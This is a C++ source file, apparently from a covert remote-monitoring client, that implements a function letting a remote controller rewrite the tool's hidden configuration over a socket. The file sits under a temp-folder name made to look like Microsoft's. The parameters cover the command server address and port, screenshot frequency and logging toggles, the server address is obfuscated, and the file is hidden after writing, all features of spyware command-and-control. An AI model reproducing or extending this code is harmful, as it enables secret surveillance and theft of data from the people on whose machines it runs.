#include "MSConfig.h"

void editparams(SOCKET& ConnectSocket)
{
     char command[1024], response[1024], fillin[64], images[16], serverAddr[64], screens[16], logs[16], temppath[1024];
     int res, serverPort, clientFreq, scrFreq, exp, cc;
     ofstream update;
     string totr;
                     
                     GetTempPath(1024, temppath);
                     strcat(temppath, "Microsoft_9021784367548932\\Temp\\Parameters.db");
                     ifstream check(temppath);
                     check.getline(fillin, 64);
                     check.getline(fillin, 64);
                     for (int i = 1 ; i <= 7 ; i ++)
                     {
                         check.getline(fillin, 64);
                         strcpy(command, fillin);
                         strcat(command, "+");
                         send(ConnectSocket, command, (int)strlen(command), 0);
                         totr.clear();
                         do
                         {
                                      res = recv(ConnectSocket, response, 1024, 0);
                                      response[res] = '\0';
                                      totr += response;
                         } while (totr[totr.length() - 1] != '+');
                     }
                     check.close();
                     strcpy(command, "OK+");
                     send(ConnectSocket, command, (int)strlen(command), 0);
                     
                        totr.clear();
                         do
                         {
                                      res = recv(ConnectSocket, response, 1024, 0);
                                      response[res] = '\0';
                                      totr += response;
                         } while (totr[totr.length() - 1] != '+');
                         if (totr == "NO+") return;
                         
                         strcpy(command, "OK+");
                         send(ConnectSocket, command, (int)strlen(command), 0);

                     totr.clear();
                     do
                     {
                                  res = recv(ConnectSocket, response, 1024, 0);
                                  response[res] = '\0';
                                  totr += response;
                     } while (totr[totr.length() - 1] != '+');
                     totr.erase(totr.length() - 1, 1);
                     clientFreq = atoi(totr.c_str());
                     strcpy(command, "OK+");
                     send(ConnectSocket, command, (int)strlen(command), 0);
                    
                      totr.clear();
                     do
                     {
                                  res = recv(ConnectSocket, response, 1024, 0);
                                  response[res] = '\0';
                                  totr += response;
                     } while (totr[totr.length() - 1] != '+');
                     totr.erase(totr.length() - 1, 1);
                     strncpy(serverAddr, totr.c_str(), 64);
                     strcpy(command, "OK+");
                     send(ConnectSocket, command, (int)strlen(command), 0);
					  
                      totr.clear();
                     do
                     {
                                  res = recv(ConnectSocket, response, 1024, 0);
                                  response[res] = '\0';
                                  totr += response;
                     } while (totr[totr.length() - 1] != '+');
                     totr.erase(totr.length() - 1, 1);
                     serverPort = atoi(totr.c_str());
                     strcpy(command, "OK+");
                     send(ConnectSocket, command, (int)strlen(command), 0);
                     
                     totr.clear();
                     do
                     {
                                  res = recv(ConnectSocket, response, 1024, 0);
                                  response[res] = '\0';
                                  totr += response;
                     } while (totr[totr.length() - 1] != '+');
                     totr.erase(totr.length() - 1, 1);
                     scrFreq = atoi(totr.c_str());
                     strcpy(command, "OK+");
                     send(ConnectSocket, command, (int)strlen(command), 0);
                     
                     totr.clear();
                     do
                     {
                                  res = recv(ConnectSocket, response, 1024, 0);
                                  response[res] = '\0';
                                  totr += response;
                     } while (totr[totr.length() - 1] != '+');
                     totr.erase(totr.length() - 1, 1);
                     strcpy(logs, totr.c_str());
                     strcpy(command, "OK+");
                     send(ConnectSocket, command, (int)strlen(command), 0);
                     
                     totr.clear();
                     do
                     {
                                  res = recv(ConnectSocket, response, 1024, 0);
                                  response[res] = '\0';
                                  totr += response;
                     } while (totr[totr.length() - 1] != '+');
                     totr.erase(totr.length() - 1, 1);
                     strcpy(screens, totr.c_str());
                     strcpy(command, "OK+");
                     send(ConnectSocket, command, (int)strlen(command), 0);
                     
                     totr.clear();
                     do
                     {
                                  res = recv(ConnectSocket, response, 1024, 0);
                                  response[res] = '\0';
                                  totr += response;
                     } while (totr[totr.length() - 1] != '+');
                     totr.erase(totr.length() - 1, 1);
                     exp = atoi(totr.c_str());
                     strcpy(command, "OK+");
                     send(ConnectSocket, command, (int)strlen(command), 0);
                     
                     totr.clear();
                     do
                     {
                                  res = recv(ConnectSocket, response, 1024, 0);
                                  response[res] = '\0';
                                  totr += response;
                     } while (totr[totr.length() - 1] != '+');
                     
                     SetFileAttributes(temppath, FILE_ATTRIBUTE_NORMAL);
                     update.open(temppath);
                     for (cc = 0 ; cc < strlen(serverAddr) ; cc ++) serverAddr[cc] = serverAddr[cc] - 1 - cc;
                     update << "#operation parameters#" << endl << endl;
                     update << "CL_F: " << clientFreq << endl;
                     update << "S_A: " << serverAddr << endl;
                     update << "S_P: " << serverPort << endl;
                     update << "SC_F: " << scrFreq << endl;
                     update << "LS: " << logs << endl;
                     update << "SS: " << screens << endl;
                     update << "EXP: " << exp << endl;
                     update.close();
                     SetFileAttributes(temppath, FILE_ATTRIBUTE_HIDDEN);
                     strcpy(command, "OK+");
                     send(ConnectSocket, command, (int)strlen(command), 0);
                     
                     closesocket(ConnectSocket);
                     return;
}
